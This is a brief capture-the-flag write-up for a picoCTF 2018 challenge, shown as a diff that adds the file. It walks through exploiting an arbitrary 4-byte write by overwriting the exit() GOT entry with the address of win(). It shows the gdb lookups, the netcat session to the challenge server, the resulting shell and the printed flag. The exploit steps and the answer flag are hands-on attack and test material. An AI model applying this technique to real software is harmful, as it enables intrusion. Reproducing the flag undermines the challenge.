@@ -1,0 +1,28 @@
+The program allows us to write 4 bytes to an arbitrary location in memory. The existence of a win() function,
+the hint at GOT, and the presence of puts() and exit() make it clear that we need to rewrite part of the GOT
+to redirect to win(). All we need are the addresses for exit and win.
+
+gdb-peda$ pdisass exit
+Dump of assembler code for function exit@plt:
+   0x080483f0 <+0>:     jmp    DWORD PTR ds:0x804a014
+   0x080483f6 <+6>:     push   0x10
+   0x080483fb <+11>:    jmp    0x80483c0
+End of assembler dump.
+gdb-peda$ p &win
+$1 = (<text variable, no debug info> *) 0x804854b <win>
+
+$ nc 2018shell3.picoctf.com 46464
+I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?
+0x804a014
+Okay, now what value would you like to write to 0x804a014
+0x804854b
+Okay, writing 0x804854b to 0x804a014
+Okay, exiting now...
+
+ls
+auth
+auth.c
+flag.txt
+xinet_startup.sh
+cat flag.txt
+picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_7a9e7634}
